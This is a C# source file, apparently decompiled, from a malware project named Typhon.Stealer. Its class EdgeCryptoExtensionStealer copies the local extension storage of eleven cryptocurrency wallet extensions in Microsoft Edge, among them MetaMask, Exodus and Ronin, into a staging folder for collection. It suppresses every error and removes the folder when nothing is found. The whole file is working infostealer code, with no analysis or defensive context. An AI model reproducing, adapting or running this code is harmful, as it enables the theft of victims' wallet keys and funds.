using System;
using System.Collections.Generic;
using System.IO;
using Typhon.Modules.Miscellaneous;

namespace Typhon.Stealer.Software.CryptoApps
{
	// Token: 0x02000024 RID: 36
	internal class EdgeCryptoExtensionStealer
	{
		// Token: 0x06000095 RID: 149 RVA: 0x00006680 File Offset: 0x00004880
		public static void GetEdgeWallets(string sSaveDir)
		{
			try
			{
				Directory.CreateDirectory(sSaveDir);
				foreach (string[] array in EdgeCryptoExtensionStealer.EdgeWalletsDirectories)
				{
					EdgeCryptoExtensionStealer.CopyWalletFromDirectoryTo(sSaveDir, array[1], array[0]);
				}
				if (Directory.GetDirectories(sSaveDir).Length == 0 && Directory.GetFiles(sSaveDir).Length == 0)
				{
					IOHelper.DeleteDirectory(sSaveDir, false);
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000096 RID: 150 RVA: 0x00006708 File Offset: 0x00004908
		private static void CopyWalletFromDirectoryTo(string sSaveDir, string sWalletDir, string sWalletName)
		{
			string copyDirPath = Path.Combine(sSaveDir, sWalletName);
			if (!Directory.Exists(sWalletDir))
			{
				return;
			}
			IOHelper.CopyDirectory(sWalletDir, copyDirPath);
		}

		// Token: 0x04000043 RID: 67
		private static readonly List<string[]> EdgeWalletsDirectories = new List<string[]>
		{
			new string[]
			{
				"Edge_Auvitas",
				Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\klfhbdnlcfcaccoakhceodhldjojboga"
			},
			new string[]
			{
				"Edge_Math",
				Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\dfeccadlilpndjjohbjdblepmjeahlmm"
			},
			new string[]
			{
				"Edge_Metamask",
				Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm"
			},
			new string[]
			{
				"Edge_MTV",
				Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\oooiblbdpdlecigodndinbpfopomaegl"
			},
			new string[]
			{
				"Edge_Rabet",
				Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\aanjhgiamnacdfnlfnmgehjikagdbafd"
			},
			new string[]
			{
				"Edge_Ronin",
				Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\bblmcdckkhkhfhhpfcchlpalebmonecp"
			},
			new string[]
			{
				"Edge_Yoroi",
				Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\akoiaibnepcedcplijmiamnaigbepmcb"
			},
			new string[]
			{
				"Edge_Zilpay",
				Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\fbekallmnjoeggkefjkbebpineneilec"
			},
			new string[]
			{
				"Edge_Exodus",
				Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\jdiccldimpdaibmpdkjnbmckianbfold"
			},
			new string[]
			{
				"Edge_Terra_Station",
				Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\ajkhoeiiokighlmdnlakpjfoobnjinie"
			},
			new string[]
			{
				"Edge_Jaxx",
				Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\dmdimapfghaakeibppbfeokhgoikeoci"
			}
		};
	}
}
